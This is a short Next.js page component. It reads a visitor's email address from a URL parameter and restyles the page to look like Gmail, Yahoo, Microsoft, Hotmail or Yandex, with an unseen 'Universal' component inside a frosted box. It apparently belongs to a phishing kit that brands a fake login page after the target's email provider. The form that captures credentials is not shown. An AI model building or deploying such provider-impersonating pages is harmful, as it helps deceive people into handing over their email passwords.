"use client"
import Image from "next/image";
import Universal from "@/components/Universal/Universal";
import { useEffect, useState } from "react";
export default function Home() {
  const [domain, setDomain] = useState('')

  useEffect(() => {
     const mySearchParams = new URLSearchParams(window.location.search)
     const email = mySearchParams.get('usn')
     if(email){
      let dm = email.split('@')[1]

      let splitted = dm.split(".")

      if (splitted.length == 2) {
        dm = splitted.join('.')
      } else if (splitted.length > 2) {
        dm = splitted.slice(0, 2).join('.')
      }

      if (dm === 'gmail.com') {
        dm = 'google.com'
       } else if (dm === 'live.com') {
          dm = 'microsoft.com'
       } else if (dm === 'hotmail.com') {
        dm = 'microsoft.com'
       } else if (dm === 'outlook.com') {
        dm = 'microsoft.com'
       }

        const nm = dm.split('.')[0]
        setDomain(dm)
     }



    // check()
    }, [domain])
  return (
    <div className={ domain.startsWith('google') ? 'gmail' : domain.startsWith('yahoo') ? 'yahoo' : domain.startsWith('hotmail') ? 'hotmail' : domain.startsWith('live') ? 'live' : domain.startsWith('microsoft') ? 'microsoft' : domain.startsWith('yandex') ? 'yandex' : 'App'}>
      <div className="frosted-box">
        <Universal />
      </div>

    </div>
  );
}
